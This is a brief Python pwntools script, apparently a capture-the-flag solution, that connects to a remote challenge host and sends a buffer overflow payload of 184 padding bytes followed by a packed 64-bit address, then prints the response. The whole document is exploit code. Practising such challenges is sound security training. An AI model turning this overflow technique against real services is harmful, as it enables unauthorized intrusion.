from pwn import *
r = remote("ctf.m4.lu", 65319)
# r = process('./chall')
r.recvuntil(b"Enter your input:")
r.sendline(b"A"*184 + p64(0x4D734941))
print(r.recvall(timeout=2).decode(errors="ignore"))
